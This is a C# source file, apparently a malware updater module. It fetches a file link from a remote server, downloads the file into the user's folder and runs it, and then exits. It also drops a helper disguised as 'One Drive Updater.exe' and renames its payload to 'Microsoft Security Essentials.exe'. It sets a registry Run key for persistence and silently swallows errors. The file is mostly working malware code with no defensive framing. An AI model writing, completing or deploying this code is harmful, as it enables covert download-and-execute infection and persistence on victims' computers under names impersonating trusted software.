using System;
using System.Net;
using System.IO;
using System.Threading;
using System.Diagnostics;

public class update
{
    public void check_for_updates(string pc_name, string code_name, string key)
    {
        try
        {
            post_req post_req = new post_req();
            var response = post_req.update(key);
            string path = $"C:\\Users\\{pc_name}\\{response["fname"]}";
            string checker_path = $"C:\\Users\\{pc_name}\\AppData\\Local\\One Drive Updater\\One Drive Updater.exe";

            if (Convert.ToBoolean(response["success"]))
            {
                if (Convert.ToString(response["vcode"]) != code_name)
                {
                    WebClient myWebClient = new WebClient();
                    myWebClient.DownloadFile(Convert.ToString(response["flink"]), path);
                    Thread.Sleep(10000);
                    Process.Start(path);

                    Environment.Exit(0);
                }
                else
                {
                    try
                    {
                        if (File.Exists(path))
                        {
                            File.Delete($"C:\\Users\\{pc_name}\\Microsoft Security Essentials.exe");
                            File.Move(path, $"C:\\Users\\{pc_name}\\Microsoft Security Essentials.exe");
                        }
                        if (!File.Exists(checker_path))
                        {
                            Directory.CreateDirectory($"C:\\Users\\{pc_name}\\AppData\\Local\\One Drive Updater");
                            WebClient myWebClient = new WebClient();
                            myWebClient.DownloadFile(/*input your url download*/, checker_path);
                            Thread.Sleep(10000);
                            Process.Start(checker_path);
                        }

                        Microsoft.Win32.RegistryKey Key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", true);
                        Key.SetValue("Microsoft Security Essentials", $"C:\\Users\\{pc_name}\\Microsoft Security Essentials.exe");
                        Key.Close();
                    }
                    catch
                    {
                    }
                }
            }
        }
        catch
        {
            Environment.Exit(0);
        }
    }
}
